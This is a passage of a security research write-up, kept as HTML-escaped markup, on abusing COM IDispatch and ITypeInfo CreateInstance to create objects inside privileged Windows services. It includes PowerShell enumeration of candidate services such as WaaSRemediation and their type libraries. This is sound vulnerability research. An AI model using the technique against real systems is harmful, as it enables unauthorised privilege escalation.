class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-ipropertybag&quot;&gt;IPropertyBag&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;interface which can be used to create an arbitrary COM object in the context of the server and get it returned to the client. This could be exploited by getting an XML DOM Document object created in the server, returned to the client marshaled by reference and then using the XSLT scripting feature to run arbitrary code in the context of the server to elevate privileges.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ROKGfcMygP-c11&quot; id=&quot;h.7wuql5mg0oj&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c15&quot;&gt;Where Does IDispatch Fits In?&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch&quot;&gt;IDispatch&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;interface is part of the OLE Automation feature, which was one of the original use cases for COM. It allows for late binding of a COM client to a server, so that the object can be consumed from scripting languages such as VBA and JScript. The interface is fully supported across process and privilege boundaries, although it&amp;#39;s more commonly used for in-process components such as ActiveX.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;To facilitate calling a COM object at runtime the server must expose some type information to the client so that it knows how to package up parameters to send via the interface&amp;#39;s &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-idispatch-invoke&quot;&gt;Invoke&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method. The type information is stored in a developer-defined &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/type-libraries-and-the-object-description-language&quot;&gt;Type Library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;file on disk, and the library can be queried by the client using the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface&amp;#39;s &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-idispatch-gettypeinfo&quot;&gt;GetTypeInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method. As the COM implementation of the type library interface is marshaled by reference, the returned &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-itypeinfo&quot;&gt;ITypeInfo&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;interface is trapped in the server and any methods called upon it will execute in the server&amp;#39;s context.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The ITypeInfo interface exposes two interesting methods that can be called by a client, &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-itypeinfo-invoke&quot;&gt;Invoke&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-itypeinfo-createinstance&quot;&gt;CreateInstance&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. It turns out &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Invoke&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not that useful for our purposes, as it&amp;#39;s not supported for remoting, it can only be called if the type library is loaded in the current process. However, &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CreateInstance&lt;/span&gt;&lt;span&gt;&amp;nbsp;is implemented as remotable, this will instantiate a COM object from a CLSID by calling &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CoCreateInstance&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;. Crucially the created object will be in the server&amp;#39;s process, not the client.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;However, if you look at the linked API documentation there is no CLSID parameter you can pass to CreateInstance, so how does the type library interface know what object to create? The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;ITypeInfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface represents any type which can be present in a type library. The type returned by &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;GetTypeInfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;just contains information about the interface the client wants to call, therefore calling &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CreateInstance&lt;/span&gt;&lt;span&gt;&amp;nbsp;will just return an error. However, the type library can also store information of &amp;quot;CoClass&amp;quot; types. These types define the CLSID of the object to create, and so calling &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CreateInstance&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;will succeed.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;How can we go from the interface type information object, to one representing a class? The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;ITypeInfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface provides us with the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-itypeinfo-getcontainingtypelib&quot;&gt;GetContainingTypeLib&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;method which returns a reference to the containing &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;ITypeLib&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface. That can then be used to enumerate all supported classes in the type library. It&amp;#39;s possible one or more of the classes are not safe if exposed remotely. Let&amp;#39;s go through a worked example using my &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;http://oleview.net&quot;&gt;OleView.NET&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;PowerShell module, first we want to find some target COM services which also support &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;. This will give us potential routes for privilege escalation.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls = Get-ComClass -Service&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls | % { Get-ComInterface -Class $_ | Out-Null }&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-in&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$_.Interfaces.InterfaceEntry.IsDispatch&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Clsid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Clsid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;WaaSRemediation&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;72566e27-1abb-4eb3-b4f0-eb431cb1cb32&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Search&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Gathering&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Manager&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;9e175b68-f52a-11d8-b9a5-505054503030&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Search&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Gatherer&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;9e175b6d-f52a-11d8-b9a5-505054503030&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;AutomaticUpdates&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;bfe18e9c-6d87-4450-b37c-e02f0b373803&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Microsoft.SyncShare.SyncShareFactory&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;da1c0281-456b-4f14-a46d-8ed2e21a866f&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;-Service&lt;/span&gt;&lt;span&gt;&amp;nbsp;switch for &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Get-ComClass&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns classes which are implemented in local services. We then query for all the supported interfaces, we don&amp;#39;t need the output from this command as the queried interfaces are stored in the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Interfaces&lt;/span&gt;&lt;span&gt;&amp;nbsp;property. Finally we select out any COM class which exposes &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span&gt;&amp;nbsp;resulting in 5 candidates. Next, we&amp;#39;ll pick the first class, &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;WaasRemediation&lt;/span&gt;&lt;span&gt;&amp;nbsp;and inspect its type library for interesting classes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;New-ComObject&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Clsid&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;72566e27-1abb-4eb3-b4f0-eb431cb1cb32&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$lib&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Import-ComTypeLib&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Object&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$obj&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; Get-ComObjRef&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$lib.Instance | Select ProcessId, ProcessName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;ProcessId ProcessName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;--------- -----------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;nbsp; &amp;nbsp; 27020 svchost.exe&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $parsed&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$lib.Parse()&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $parsed&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Version TypeLibId&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -------- ---------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;WaaSRemediationLib 1.0 &amp;nbsp; &amp;nbsp; &amp;nbsp;3ff1aab8-f3d8-11d4-825d-00104b3646c0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$parsed.Classes&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Uuid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Uuid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;WaaSRemediationAgent &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;72566e27-1abb-4eb3-b4f0-eb431cb1cb32&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;WaaSProtectedSettingsProvider 9ea82395-e31b-41ca-8df7-ec1cee7194df&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
